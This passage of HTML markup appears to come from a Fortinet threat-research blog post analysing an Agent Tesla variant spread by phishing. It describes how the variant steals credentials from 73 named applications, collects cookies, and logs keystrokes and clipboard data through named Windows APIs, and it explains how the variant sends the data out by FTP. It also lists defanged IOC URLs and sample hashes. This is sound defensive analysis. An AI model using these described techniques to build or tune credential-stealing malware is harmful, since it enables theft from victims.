+            <img src="/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant/_jcr_content/root/responsivegrid/image_1677279354.img.png/1622774318432/picture43png.png" alt="Figure 4.2 – Process Tree of all relevant processes of the campaign" class="custom"/>
+        </noscript>
+    
+    
+    <!--<div class="enlarge-btn" data-sly-test=""><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
+    <span class="cmp-image--title">Figure 4.2 – Process Tree of all relevant processes of the campaign</span>
+
+
+    
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <h2>Agent Tesla Running Within MSBuild.exe Process to Steal Data</h2>
+<p>I extracted this new Agent Tesla variant to a local file from the large array ($Cli444) for static analysis.</p>
+<p>According to Figure 5.1, below, we can see that this new variant is fully obfuscated, meaning it is able to protect its code from being easily analyzed by security researchers. </p>
+<p>The class names, function names, and variable names are meaningless, as shown in Figure 5.1 (such as “A”, “a”, “B”, “b”, “C”, “c” and so on.) For instance, the entry point function of this variant is this— “A.b.A()”.</p>
+
+
+</div>
+<div class="cmp cmp-image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--10 aem-GridColumn--offset--default--1">
+
+    
+        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
+            
+            <img src="/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant/_jcr_content/root/responsivegrid/image_1377563013.img.png/1622774427306/screen-shot-2021-06-03-at-7.40.04-pm.png" alt="Figure 5.1 – Obfuscated new variant of Agent Tesla" class="custom"/>
+        </noscript>
+    
+    
+    <!--<div class="enlarge-btn" data-sly-test=""><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
+    <span class="cmp-image--title">Figure 5.1 – Obfuscated new variant of Agent Tesla</span>
+
+
+    
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <p>When Agent Tesla starts in MSBuild.exe, it first checks to see if there is a duplicate Agent Tesla running. If one is found, it is killed to keep only one instance running at the same time.</p>
+<p>Once every time it runs, it steals the credentials of applications (like Web Browsers, FTP clients, IM, etc.) saved on the infected device and sends the stolen data to the attacker.</p>
+<p>According to my research, it steals sensitive information from 73 different applications, which can be categorized by their features, as below: </p>
+<p><b>Web Browsers: </b></p>
+<p>&quot;Chrome&quot;, &quot;Firefox&quot;, &quot;Edge&quot;, &quot;Safari&quot;, &quot;SRWare Iron&quot;, &quot;CoolNovo&quot;, &quot;QQ Browser&quot;, &quot;UC Browser&quot;, &quot;Elements Browser&quot;, &quot;QIP Surf&quot;, &quot;Epic Privacy&quot;, &quot;Amigo&quot;, &quot;Coccoc&quot;, &quot;Coowon&quot;, &quot;Torch Browser&quot;, &quot;Orbitum&quot;, &quot;Yandex Browser&quot;, &quot;Sputnik&quot;, &quot;Chedot&quot;, &quot;Vivaldi&quot;, &quot;Iridium Browser&quot;, &quot;360 Browser&quot;, &quot;Chromium&quot;, &quot;Opera Browser&quot;, &quot;Sleipnir 6&quot;, &quot;Liebao Browser&quot;, &quot;CentBrowser&quot;, &quot;Brave&quot;, &quot;Cool Novo&quot;, &quot;Citrio&quot;, &quot;Uran&quot;, &quot;7Star&quot;, &quot;Kometa&quot;, &quot;Comodo Dragon&quot;,&quot;K-Meleon&quot;, &quot;FALKON&quot;, &quot;IceCat&quot;, &quot;Flock&quot;, &quot;WaterFox&quot;, &quot;PaleMoon&quot;, &quot;UCBrowser&quot;, &quot;IceDragon&quot;, &quot;QQBrowser&quot;, &quot;SeaMonkey&quot;, &quot;BlackHawk&quot;, &quot;CyberFox&quot;</p>
+<p><b>Email Clients and Messenger Clients:</b></p>
+<p>&quot;Postbox&quot;, &quot;Foxmail&quot;, &quot;Eudora&quot;, &quot;Mailbird&quot;, &quot;Becky!&quot;, &quot;Opera Mail&quot;, &quot;Outlook&quot;, &quot;Thunderbird&quot;, &quot;eM Client&quot;, &quot;IncrediMail&quot;, &quot;Claws-mail&quot;, &quot;The Bat!&quot;, &quot;Pocomail&quot;<br />
+&quot;Psi&quot;, &quot;Trillian&quot;</p>
+<p><b>VPN, FTP Clients and Download Managers:</b></p>
+<p>&quot;DownloadManager&quot;, &quot;jDownloader&quot;, &quot;OpenVPN&quot;, &quot;SmartFTP&quot;, &quot;FTPGetter&quot;, &quot;WS_FTP&quot;, &quot;FileZilla&quot;, &quot;CFTP&quot;, &quot;FTP Navigator&quot;, &quot;CoreFTP&quot;, &quot;WinSCP&quot;, &quot;FlashFXP&quot;</p>
+<p>Figure 5.2 shows the moment it has obtained sensitive data from Mozilla Firefox. This data contains user credentials (UserName and Password), the application name “Firefox”, as well as the URLs where the credentials are saved. The data will then be sent to the attacker with magic flag “PW_”. I will elaborate on how the stolen data is sent to the attacker later.</p>
+
+
+</div>
+<div class="cmp cmp-image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--10 aem-GridColumn--offset--default--1">
+
+    
+        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
+            
+            <img src="/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant/_jcr_content/root/responsivegrid/image_562671705.img.png/1622774459148/picture52.png" alt="Figure 5.2 – Display of sensitive data stolen from Mozilla Firefox" class="custom"/>
+        </noscript>
+    
+    
+    <!--<div class="enlarge-btn" data-sly-test=""><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
+    <span class="cmp-image--title">Figure 5.2 – Display of sensitive data stolen from Mozilla Firefox</span>
+
+
+    
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <p>It starts a thread function that is used to collect cookies files from some predefined web browsers. These collected cookies files are then compressed into a ZIP archive and sent to the attacker with the magic flag “CO_”. Figure 5.3 is an example of such a ZIP archive, containing the cookies files collected from Mozilla Firefox and Google Chrome on my test machine.</p>
+
+
+</div>
+<div class="cmp cmp-image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--10 aem-GridColumn--offset--default--1">
+
+    
+        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
+            
+            <img src="/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant/_jcr_content/root/responsivegrid/image_1551921172.img.png/1622774499630/picture53.png" alt="Figure 5.3 – Tree view of one ZIP archive with collected cookies files" class="custom"/>
+        </noscript>
+    
+    
+    <!--<div class="enlarge-btn" data-sly-test=""><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
+    <span class="cmp-image--title">Figure 5.3 – Tree view of one ZIP archive with collected cookies files</span>
+
+
+    
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <p>In addition to what I explained above, it also collects data from the system clipboard and the victim’s inputs (the keylogger). It calls the API SetClipboardViewer() to register itself so it is able to receive notice once the clipboard data is changed. It can then obtain and save clipboard data.</p>
+<p>The attacker also enabled the keylogger feature in this variant. It sets a hook on the Windows message WH_KEYBOARD_LL (13) by calling the API function SetWindowsHookEx(), so it can receive all keyboard messages when the victim types. Both data collected from the clipboard and through victim’s inputs are saved in html format in a global variable. Agent Tesla starts a Timer (being called every 20 minutes) to check if the global variable has data, and if so, it sends its data to the attacker with the magic flag “KL_”. </p>
+<p>As shown in Figure 5.4 is an example of the data collected from victim’s inputs and the clipboard that were extracted by me when it was sent to the attacker.</p>
+
+
+</div>
+<div class="cmp cmp-image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--10 aem-GridColumn--offset--default--1">
+
+    
+        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
+            
+            <img src="/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant/_jcr_content/root/responsivegrid/image_998066827.img.png/1622774528041/picture54.png" alt="Figure 5.4 – Example of collected keylogger and clipboard data" class="custom"/>
+        </noscript>
+    
+    
+    <!--<div class="enlarge-btn" data-sly-test=""><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
+    <span class="cmp-image--title">Figure 5.4 – Example of collected keylogger and clipboard data</span>
+
+
+    
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <p>As you can see, this data contains basic information, including current time, User Name, Computer Name, OS version, CPU type, and memory capacity. The keylogger data contains application name (“Google Chrome”), application title (“New Tab – Google Chrome”), current time (05/21/2021 10:48:18), as well as victim’s inputs at the second line. The clipboard data starts with a constant string “Copied Text:” and clipboard data at the second line.</p>
+<h2>Sending Stolen Data to the Attacker</h2>
+<p>Agent Tesla supports several ways to send stolen data to its C2 server. They are over SMTP to send data to the attacker’s email address, over FTP to send the data to the attacker’s FTP server, and over HTTP POST to send the data to attacker’s HTTP server. </p>
+<p>The variant we captured uses FTP protocol’s STOR command (store) to submit the stolen sensitive data. </p>
+<p>Agent Tesla has several magic flags to identify what kind of the data is being reported. These are “PW_” for credentials, “CO_” for cookies files, “KL” for keylogger and clipboard, and “SC_” for screenshot (not enabled in this variant). The data file name consists of a magic flag, User Name, Computer Name, and current time. </p>
+<p>Figure 6.1 shows a screenshot of Wireshark displaying the data transportation process in an FTP-Data packet (with the magic flag “PW_”), where it contains stolen credentials saved in Firefox and FileZilla.</p>
+
+
+</div>
+<div class="cmp cmp-image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--10 aem-GridColumn--offset--default--1">
+
+    
+        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
+            
+            <img src="/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant/_jcr_content/root/responsivegrid/image_111356051.img.png/1622774561718/picture16.png" alt="Figure 6.1 – FTP packet with stolen credentials" class="custom"/>
+        </noscript>
+    
+    
+    <!--<div class="enlarge-btn" data-sly-test=""><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
+    <span class="cmp-image--title">Figure 6.1 – FTP packet with stolen credentials</span>
+
+
+    
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <h2>Conclusion</h2>
+<p>Most attackers like to spread malware in phishing emails. As a result, new phishing campaigns are detected every day by FortiGuard Labs. People should be more careful when opening files attached to email.</p>
+<p>The one I just analyzed not only used a VBScript to hijack the victim’s clipboard but also delivered a new variant of Agent Tesla. In this post I walked through this campaign, beginning with how the malicious Macro inside an attached Microsoft Excel document is executed. I then elaborated on how the three VBScript code segments found in the response from 27.html work to perform a bitcoin address hijack and to launch a new variant of Agent Tesla. Next, I demonstrated what applications this variant could steal sensitive data from, and what kind of sensitive data Agent Tesla is interested in, including saved credentials, cookies files of some web browsers, keylogger data, and clipboard data. And finally, I introduced how the stolen data is submitted to the attacker using an FTP-DATA packet.</p>
+<h2>Fortinet Protections</h2>
+<p>Fortinet customers are already protected from this Agent Tesla variant with FortiGuard’s Web Filtering, Anti-Spamming, and AntiVirus services, as follow:</p>
+<p>The related URLs listed in IOCs have been rated as &quot;<b>Malicious Websites</b>&quot; by the FortiGuard Web Filtering service.</p>
+<p>The phishing email has been marked as SPAM by FortiMail. The attached Excel file is detected as “<b>VBA/Agent.WCN!tr</b>” and blocked by the FortiGuard AntiVirus service.</p>
+<p>The FortiGuard AntiVirus service is supported by <a href="https://www.fortinet.com/products/next-generation-firewall.html?utm_source=blog&amp;utm_campaign=fortigate">FortiGate</a>, <a href="https://www.fortinet.com/products/email-security/fortimail.html?utm_source=blog&amp;utm_campaign=fortimail-main-page">FortiMail,</a> FortiClient, and <a href="https://www.fortinet.com/products/endpoint-security/fortiedr.html?utm_source=blog&amp;utm_campaign=fortiedr">FortiEDR</a>. The Fortinet AntiVirus engine is a part of each of those solutions as well. As a result, customers who have these products with up-to-date versions are protected.</p>
+<p>We also suggest our readers go through the free <a href="https://training.fortinet.com/?utm_source=blog&amp;utm_campaign=nse-institute">NSE training</a> — <a href="https://training.fortinet.com/local/staticpage/view.php?page=nse_1&amp;utm_source=blog&amp;utm_campaign=nse-1">NSE 1 – Information Security Awareness</a>, which has a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks.<b></b></p>
+<h2>IOCs:</h2>
+<p><b>URLs</b></p>
+<p>hxxp://www[.]j[.]mp/ais1kdoaksodjasod14<br />
+hxxp://bit[.]ly/ais1kdoaksodjasod14<br />
+hxxps://p8hj[.]blogspot[.]com/p/27[.]html<br />
+hxxps://ia601500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-1.txt<br />
+hxxps://ia601500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-2.txt<br />
+hxxps://ia801500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-3.txt<br />
+hxxp://1230948%1230948@getyournewblog[.]blogspot[.]com/p/27.html<br />
+hxxp://1230948%1230948@newblogset144[.]blogspot[.]com/p/27.html<br />
+hxxp://1230948%1230948@firstblognew123[.]blogspot[.]com/p/27.html<br />
+hxxp://1230948%1230948@papagunnakjdnmwdnwmndwm[.]blogspot[.]com/p/27.html</p>
+<p><b>Sample SHA-256</b></p>
+<p>[Order Requirements and Specs.xls]<br />
+F10D005B7997686E87BAEE766E5B28BE3386FE3BA9A557BD2042DCBA5414B740</p>
+<p>[Extracted new variant of Agent Tesla]<br />
+6FED3E1D302B9DF7893248367ED06F8A4F5BA2D3B7547E3F49D1D00A7718A8B4</p>
+<h2>Reference:</h2>
+<p><i style=""><a href="https://www.fortinet.com/blog/threat-research/new-agent-tesla-variant-spreading-by-phishing">New Agent Tesla Variant Spreading by Phishing</a></i><br />
+</p>
+<p><i>Learn more about Fortinet’s </i><a href="https://www.fortinet.com/fortiguard/labs?utm_source=blog&amp;utm_campaign=fortiguard-labs"><i>FortiGuard Labs</i></a><i> threat research and intelligence organization and the FortiGuard Security Subscriptions and Services </i><a href="https://www.fortinet.com/fortiguard/labs?tab=security-bundles&amp;utm_source=blog&amp;utm_campaign=security-bundles"><i>portfolio</i></a><i>.</i></p>
+<p><i>Learn more about Fortinet’s </i><a href="https://www.fortinet.com/training/cybersecurity-professionals?utm_source=blog&amp;utm_medium=campaign&amp;utm_campaign=Freetraininginitiative"><i>free cybersecurity training</i></a><i>, an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the </i><a href="https://training.fortinet.com/?utm_source=blog&amp;utm_campaign=nse-institute"><i>Fortinet Network Security Expert program</i></a><a href="https://training.fortinet.com/local/staticpage/view.php?page=fnsa&amp;utm_source=pr&amp;utm_campaign=fnsa"><i>, Security Academy program</i></a><i>, and </i><a href="https://www.fortinet.com/corporate/careers/vets.html?utm_source=blog&amp;utm_campaign=fortivet"><i>Veterans program</i></a><i>.</i></p>
+
+
+</div>
+<div class="raw-import aem-GridColumn aem-GridColumn--default--12">
+<div class="text-container"><div id="om-qbkzwxxbiv83f0ol5a2d-holder"></div>
+</div>
+</div>
+
+    
+</div>
+</div>
+<div class="b16-blog-tags aem-GridColumn aem-GridColumn--default--12">
+
+
+
+  <div class="b16-blog-tags__container text-container" style="display:none">
+    <span class="b16-blog-tags__headline">Tags:</span>
+    <p class="b16-blog-tags__tag-links">
+      <a href="https://www.fortinet.com/blog/tags-search.html?tag=cybersecurity-architect">Cybersecurity Architect</a>, 
+    
+      <a href="https://www.fortinet.com/blog/tags-search.html?tag=fortiguard-labs">FortiGuard Labs</a>
+    </p>
+  </div>
+
+</div>
+<section class="b12-related aem-GridColumn aem-GridColumn--default--12">
+
+
+
+
+<div class="b12-related__container text-container">
+    
+
+    
+    
+    <h3>Related Posts</h3>
+    <div class="b12-related__posts">
+        
+        <a href="/blog/threat-research/predator-the-thief-new-routes-delivery" class="b12-related__post b12-related__post-0">
+            <div class="b12-related__image" style="background-image:url(/content/dam/fortinet-blog/article-images/protect-the-thief/header_theat_blog.png.thumb.319.319.png);">
+                <img class="ratio" alt="Predator the Thief: New Routes of Delivery" aria-hidden="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII="/>
+            </div>
+
+            <div class="b12-related__text">
+                <p class="b12-related__category">
+                    FortiGuard Labs Threat Research
+                </p>
+                <h5 class="b12-related__title">Predator the Thief: New Routes of Delivery</h5>
+            </div>
+        </a>
+    
+    
+        
+        <a href="/blog/threat-research/closer-look-satan-ransomwares-propagation-technics" class="b12-related__post b12-related__post-1">
+            <div class="b12-related__image" style="background-image:url(/content/dam/fortinet-blog/article-images/satan-ransomware-blog/satan-ransomware-blog-img.png.thumb.319.319.png);">
+                <img class="ratio" alt="A Closer Look at Satan Ransomware’s Propagation Techniques" aria-hidden="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII="/>
+            </div>
+
+            <div class="b12-related__text">
+                <p class="b12-related__category">
+                    FortiGuard Labs Threat Research
+                </p>
+                <h5 class="b12-related__title">A Closer Look at Satan Ransomware’s Propagation Techniques</h5>
+            </div>
+        </a>
+    
+    
+        
+        <a href="/blog/threat-research/microsoft-windows-office-zeroday-remote-code-vulnerabilities" class="b12-related__post b12-related__post-2">
+            <div class="b12-related__image" style="background-image:url(/content/dam/fortinet-blog/article-images/lockergoga-blog/microsoft-blog-img.png.thumb.319.319.png);">
+                <img class="ratio" alt="Patch Your Microsoft Windows and Office: Fortinet Discovers Three Zero-Day Remote Code Execution Vulnerabilities" aria-hidden="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII="/>
+            </div>
+
+            <div class="b12-related__text">
+                <p class="b12-related__category">
+                    FortiGuard Labs Threat Research
+                </p>
+                <h5 class="b12-related__title">Patch Your Microsoft Windows and Office: Fortinet Discovers Three Zero-Day Remote Code Execution Vulnerabilities</h5>
+            </div>
+        </a>
+    
+    </div>
+</div>
+
+
+</section>
+<div class="b13-comment-section aem-GridColumn aem-GridColumn--default--12">
+
+
+<div class="b13-comment-section__container text-container">
+
+
+  <!--data-sly-test="true - got replaced with false to disable the discussion event-->
+  
+</div>
+</div>
+<div class="b6-footer aem-GridColumn aem-GridColumn--default--12">
+
+
+  
+
+  <div class="b6-footer__container text-container">
+    <div class="b6-footer__footer-info">
+      <div class="b6-footer__logo">
+        <a href="https://www.fortinet.com" target="_blank">
+          <img src="/content/dam/fortinet-blog/fortinet-logo-white.svg" alt="Fortinet"/>
+        </a>
+      </div>
+      <div class="b6-footer__social-footer">
+        <ul>
+          
+            <li class="social-icon linkedin">
+              <a href="https://www.linkedin.com/company/fortinet" target="_blank">
+                
+    <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M15.934 15.835H12.55v-5.712c0-.897-1.008-1.64-1.905-1.64s-1.48.743-1.48 1.64v5.712H5.78V5.68h3.385v1.693c.558-.905 1.996-1.49 2.96-1.49 2.116 0 3.81 1.727 3.81 3.817v6.135zm-11.846 0H.703V5.68h3.385v10.155zM2.395.605c.935 0 1.693.757 1.693 1.69 0 .936-.758 1.694-1.693 1.694S.703 3.23.703 2.29C.703 1.36 1.46.6 2.395.6z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
+    </svg>
+
+              </a>
+            </li>
+          
+            <li class="social-icon twitter">
+              <a href="https://www.twitter.com/fortinet" target="_blank">
+                
+    <svg width="1200" height="1227" viewBox="0 0 1200 1227" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white"/>
+    </svg>
+
+              </a>
+            </li>
+          
+            <li class="social-icon youtube">
+              <a href="https://www.youtube.com/channel/UCJHo4AuVomwMRzgkA5DQEOA?sub_confirmation=1" target="_blank">
+                
+    <svg viewBox="0 0 18 14" xmlns="http://www.w3.org/2000/svg">
+        <path d="M7.472 11.027V3.412L12.55 7.22l-5.08 3.806zM15.934.787C15.426.62 12.294.45 9.164.45c-3.13 0-6.26.16-6.77.322-1.32.44-1.69 3.4-1.69 6.447 0 3.03.37 6 1.69 6.43.51.17 3.64.33 6.77.33 3.13 0 6.262-.16 6.77-.33 1.32-.43 1.692-3.4 1.692-6.44 0-3.047-.372-6-1.692-6.43z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
+    </svg>
+
+              </a>
+            </li>
+          
+            <li class="social-icon instagram">
+              <a href="https://www.instagram.com/fortinet/" target="_blank">
+                
+    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+        <path class="st0" d="M16,3.7c4,0,4.5,0,6.1,0.1c1.5,0.1,2.3,0.3,2.8,0.5c0.7,0.3,1.2,0.6,1.7,1.1c0.5,0.5,0.8,1,1.1,1.7
+          c0.2,0.5,0.4,1.3,0.5,2.8c0.1,1.6,0.1,2.1,0.1,6.1s0,4.5-0.1,6.1c-0.1,1.5-0.3,2.3-0.5,2.8c-0.3,0.7-0.6,1.2-1.1,1.7
+          c-0.5,0.5-1,0.8-1.7,1.1c-0.5,0.2-1.3,0.4-2.8,0.5c-1.6,0.1-2.1,0.1-6.1,0.1s-4.5,0-6.1-0.1c-1.5-0.1-2.3-0.3-2.8-0.5
+          c-0.7-0.3-1.2-0.6-1.7-1.1c-0.5-0.5-0.8-1-1.1-1.7c-0.2-0.5-0.4-1.3-0.5-2.8C3.7,20.5,3.7,20,3.7,16s0-4.5,0.1-6.1
+          c0.1-1.5,0.3-2.3,0.5-2.8C4.6,6.5,4.9,6,5.4,5.4c0.5-0.5,1-0.8,1.7-1.1c0.5-0.2,1.3-0.4,2.8-0.5C11.5,3.7,12,3.7,16,3.7 M16,1
+          c-4.1,0-4.6,0-6.2,0.1C8.2,1.2,7.1,1.4,6.2,1.8c-1,0.4-1.8,0.9-2.7,1.7C2.7,4.4,2.2,5.2,1.8,6.2c-0.4,1-0.6,2-0.7,3.6
+          C1,11.4,1,11.9,1,16c0,4.1,0,4.6,0.1,6.2c0.1,1.6,0.3,2.7,0.7,3.6c0.4,1,0.9,1.8,1.7,2.7c0.8,0.8,1.7,1.3,2.7,1.7
+          c1,0.4,2,0.6,3.6,0.7C11.4,31,11.9,31,16,31s4.6,0,6.2-0.1c1.6-0.1,2.7-0.3,3.6-0.7c1-0.4,1.8-0.9,2.7-1.7c0.8-0.8,1.3-1.7,1.7-2.7
+          c0.4-1,0.6-2,0.7-3.6C31,20.6,31,20.1,31,16s0-4.6-0.1-6.2c-0.1-1.6-0.3-2.7-0.7-3.6c-0.4-1-0.9-1.8-1.7-2.7
+          c-0.8-0.8-1.7-1.3-2.7-1.7c-1-0.4-2-0.6-3.6-0.7C20.6,1,20.1,1,16,1L16,1z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
+        <path class="st0" d="M16,8.3c-4.3,0-7.7,3.4-7.7,7.7s3.4,7.7,7.7,7.7s7.7-3.4,7.7-7.7S20.3,8.3,16,8.3z M16,21c-2.8,0-5-2.2-5-5
+          s2.2-5,5-5s5,2.2,5,5S18.8,21,16,21z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
+        <circle class="st0" cx="24" cy="8" r="1.8" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></circle>
+    </svg>
+
+              </a>
+            </li>
+          
+            <li class="social-icon facebook">
+              <a href="https://www.facebook.com/fortinet" target="_blank">
+                
+    <svg viewBox="0 0 9 18" xmlns="http://www.w3.org/2000/svg">
+        <path d="M8.934.758v3.385H7.24c-.583 0-.845.685-.845 1.27v2.114h2.54v3.385h-2.54v6.77H3.01v-6.77H.472V7.527H3.01V4.143c0-1.87 1.516-3.385 3.385-3.385h2.54z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
+    </svg>
+
+              </a>
+            </li>
+          
+            <li class="social-icon rss">
+              <a href="https://www.fortinet.com/rss-feeds.html" target="_blank">
+                
+    <svg viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.072 17.68c-1.27 0-2.37-1.1-2.37-2.368 0-1.27 1.1-2.37 2.37-2.37s2.37 1.1 2.37 2.37-1.016 2.37-2.37 2.37zM.702.76v2.538c7.955 0 14.386 6.43 14.386 14.385h2.538C17.626 8.336 10.05.76.703.76zm0 5.162V8.46c5.078 0 9.224 4.146 9.224 9.223h2.54c0-6.514-5.248-11.76-11.763-11.76z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
+    </svg>
+
+              </a>
+            </li>
+          
+        </ul>
+      </div>
+    </div>
+    <div class="b6-footer__footer-links">
+      
+        <div class="b6-footer__footer-links-column">
+          <h4 class="b6-footer__header">News &amp; Articles</h4>
+          <ul>
+            
+              <li>
+                <a href="https://www.fortinet.com/corporate/about-us/newsroom/press-releases.html" target="_self">News Releases</a>
+              </li>
+            
+              <li>
+                <a href="https://www.fortinet.com/corporate/about-us/newsroom/news.html" target="_blank">News Articles</a>
+              </li>
+            
+          </ul>
+        </div>
+      
+        <div class="b6-footer__footer-links-column">
+          <h4 class="b6-footer__header">Security Research</h4>
+          <ul>
+            
+              <li>
+                <a href="https://www.fortinet.com/fortiguard/threat-intelligence/threat-research.html" target="_self">Threat Research</a>
+              </li>
+            
+              <li>
+                <a href="https://fortiguard.com/" target="_self">FortiGuard Labs</a>
+              </li>
+            
+              <li>
+                <a href="https://www.fortinet.com/fortiguard/threat-intelligence/threat-map.html" target="_self">Threat Map</a>
+              </li>
+            
+              <li>
+                <a href="https://www.fortinet.com/solutions/ransomware.html" target="_self">Ransomware Prevention</a>
+              </li>
+            
+          </ul>
+        </div>
+      
+        <div class="b6-footer__footer-links-column">
+          <h4 class="b6-footer__header">Connect With Us</h4>
+          <ul>
+            
+              <li>
+                <a href="https://community.fortinet.com/" target="_blank">Fortinet Community</a>
+              </li>
+            
+              <li>
+                <a href="https://www.fortinet.com/partners/partner-program/become-a-fortinet-partner" target="_blank">Partner Portal</a>
+              </li>
+            
+              <li>
+                <a href="https://investor.fortinet.com/" target="_blank">Investor Relations</a>
+              </li>
+            
+              <li>
+                <a href="https://www.fortinet.com/corporate/about-us/product-certifications" target="_blank">Product Certifications</a>
+              </li>
+            
+          </ul>
+        </div>
+      
+        <div class="b6-footer__footer-links-column">
+          <h4 class="b6-footer__header">Company</h4>
+          <ul>
+            
+              <li>
+                <a href="https://www.fortinet.com/corporate/about-us/about-us" target="_blank">About Us</a>
+              </li>
+            
+              <li>
+                <a href="https://www.fortinet.com/corporate/about-us/executive-management" target="_self">Exec Mgmt</a>
+              </li>
+            
+              <li>
+                <a href="https://www.fortinet.com/corporate/careers" target="_self">Careers</a>
+              </li>
+            
+              <li>
+                <a href="https://www.fortinet.com/nse-training" target="_self">Training</a>
+              </li>
+            
+              <li>
+                <a href="https://www.fortinet.com/corporate/about-us/events" target="_self">Events</a>
+              </li>
+            
+              <li>
+                <a href="https://www.fortinet.com/corporate/about-us/industry-awards" target="_self">Industry Awards</a>
+              </li>
+            
+              <li>
+                <a href="https://www.fortinet.com/corporate/about-us/corporate-social-responsibility" target="_self">Social Responsibility</a>
+              </li>
+            
+              <li>
+                <a href="/resources/cyberglossary" target="_self">CyberGlossary</a>
+              </li>
+            
+              <li>
+                <a href="https://www.fortinet.com/sitemap" target="_self">Sitemap</a>
+              </li>
+            
+              <li>
+                <a href="https://www.fortinet.com/blog/blog-sitemap" target="_self">Blog Sitemap</a>
+              </li>
+            
+          </ul>
+        </div>
+      
+      <div class="b6-footer__contact-info">
+        <h4 class="b6-footer__header">Contact Us</h4>
+        <ul>
+          <li>(866) 868-3678</li>
+        </ul>
+      </div>
+    </div>
+    <div class="b6-footer__copyright">
+      <div class="b6-footer__copyright-info">
+        <p class="b6-footer__copyright-text">Copyright © 2023 Fortinet, Inc. All Rights Reserved</p>
+        
+          <a class="b6-footer__copyright-link" href="https://www.fortinet.com/corporate/about-us/legal.html" target="_blank">Terms of Services</a>
+        
+          <a class="b6-footer__copyright-link" href="https://www.fortinet.com/corporate/about-us/privacy.html" target="_blank">Privacy Policy</a>
+        
+        <span class="ot-ftnt-cookie-settings"> | <a href="#" onclick="Optanon.ToggleInfoDisplay()">Cookie Settings</a></span>
+      </div>
+    </div>
+  </div>
+
+<!-- Launch COnfiguration -->
+
+
+<!-- END Launch COnfiguration --></div>
+
+    
+</div>
+</div>
+
+
+    
+    
+    
+    
+    
+<script type="text/javascript" src="/etc.clientlibs/fortinet-blog/clientlibs/clientlib-base.min.js"></script>
+
+
+
+
+
+    
+
+
+    
+
+    </body>
+    </html>
